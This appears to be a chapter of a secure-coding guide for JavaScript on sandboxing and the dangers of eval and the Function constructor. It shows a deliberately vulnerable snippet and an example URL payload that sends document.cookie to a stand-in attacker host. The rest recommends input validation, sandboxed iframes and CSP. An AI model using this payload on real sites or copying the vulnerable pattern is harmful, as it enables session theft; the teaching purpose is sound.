Sandboxing
==========

Special on [Output Encoding][1] and [Database Security][2] sections you've been
told that user input should be always handled as untrusted and unsafe data.
Moreover user input data should never be subject of string concatenation to
computed, for examples, database queries.

You'll find to more General Coding Practices on [OWASP SCP - Quick Reference
Guide][3] which we will address together

* "_Do not pass user supplied data to any dynamic execution function_"
* "_Restrict users from generating new code or altering existing code_"

Let's be brief: `eval` is evil (or at least it is when misunderstood)!

[`eval`][4] is a JavaScript function which, generally speaking, evaluates given
argument (`String`) as source code, making it execute in the runtime context.

This would be the same than dynamically add a new `<script>` HTML element to
the page's body.

Note that evaluating arbitrary user input in your application's runtime context
**SHOULD NEVER** be done.

`eval` is not the only way to evaluate arbitrary `String`s: you may want to have
a look at [Function constructor][5]. We go with a simple examples

```javascript
const myAlert = Function('alert("' + document.location.hash.substring(1) + '")');
myAlert();
```

So, let's visit and "share sorrys"

```
https://example.com/#sorry");(new Image).src="//attacker.com/?cookie="+document.cookie;("
```

Rule of thumbs and further more that user input (as other data sources may cause
you troubles): [identify and classify your data sources as "trusted" and
"untrusted"][6] and **ALWAYS** (but **ALWAYS) perform [input validation][7],
rejecting the invalid input.

If after all you really need to execute untrusted data, please use a sandbox.

On the client-side the best you can do is loading the insecure content in a
`<iframe>` HTML element with the attribute `sandbox` set. You can [find the spec
here][8]. Whenever possible, provide a [Content Security Policy][9].

Server-side you have a few more options.
Have a look at this projects

* [gf3/sanbox][10]
* [patriksimek/vm2][11]
* [PhantomJS][12] (_a headless WebKit scriptable with a JavaScript API._)

**Note** that [Node.js VM module][13] is not intended to execute untrusted code.

[1]: ../output-encoding/README.md
[2]: ../database-security/README.md
[3]: https://www.owasp.org/index.php/OWASP_Secure_Coding_Practices_-_Quick_Reference_Guide
[4]: http://www.ecma-international.org/ecma-262/6.0/#sec-eval-x
[5]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function
[6]: ../input-validation/data-sources.md
[7]: ../input-validation/README.md
[8]: https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox
[9]: ./content-security-policy.md
[10]: https://github.com/gf3/sandbox
[11]: https://github.com/patriksimek/vm2
[12]: http://phantomjs.org/
[13]: https://nodejs.org/dist/latest-v6.x/docs/api/vm.html